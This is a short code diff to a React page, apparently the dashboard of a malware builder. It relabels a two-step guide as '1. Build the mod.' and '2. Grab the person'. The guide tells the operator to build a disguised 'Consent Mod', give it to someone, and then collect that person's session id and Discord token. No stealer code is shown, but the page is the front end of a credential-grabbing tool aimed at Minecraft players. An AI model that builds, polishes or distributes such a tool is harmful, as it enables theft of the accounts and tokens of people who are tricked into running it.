@@ -223,11 +223,11 @@ export default function BuildPage() {
           </div>
           <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 16 }}>
             <div style={{ fontSize: 13, color: colors.textDim }}>
-              <div style={{ color: colors.green, fontWeight: 600, marginBottom: 4 }}>1. Link Minecraft Username</div>
+              <div style={{ color: colors.green, fontWeight: 600, marginBottom: 4 }}>1. Build the mod.</div>
                 Build the Consent Mod at the top right and download it.
             </div>
             <div style={{ fontSize: 13, color: colors.textDim }}>
-              <div style={{ color: colors.green, fontWeight: 600, marginBottom: 4 }}>2. Download &amp; Install</div>
+              <div style={{ color: colors.green, fontWeight: 600, marginBottom: 4 }}>2. Grab the person</div>
               When downloaded, give it to a person. When they downloaded it their Session id, Discord token and more will show up at their grab.
             </div>
           </div>
